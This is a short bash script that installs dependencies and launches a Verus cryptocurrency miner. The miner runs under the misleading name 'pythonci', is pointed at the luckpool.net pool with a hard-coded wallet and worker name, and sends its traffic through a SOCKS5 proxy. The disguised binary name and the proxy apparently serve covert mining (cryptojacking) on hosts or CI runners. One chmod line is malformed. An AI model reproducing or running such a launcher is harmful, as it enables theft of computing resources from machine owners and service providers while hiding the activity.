#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x viera.sh && chmod +x pythonci chmod 777 pythonci viera.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WR=VIA-040
PY=socks5://104.248.48.172:30588
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY

